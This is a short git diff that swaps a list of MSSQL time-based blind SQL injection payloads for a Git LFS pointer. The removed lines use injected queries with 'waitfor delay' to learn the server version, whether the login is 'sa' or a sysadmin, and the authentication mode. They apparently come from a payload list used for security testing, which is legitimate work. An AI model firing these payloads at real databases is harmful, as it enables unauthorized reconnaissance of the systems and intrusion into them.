@@ -1,8 +1,3 @@
-'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
-'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
-'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
-'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --
-'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
-'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
-'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
-'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
+version https://git-lfs.github.com/spec/v1
+oid sha256:a2fb40547106c4bc33e95a38eff5a7815533a7f40e358fa24935a1e0c0f6da6e
+size 618
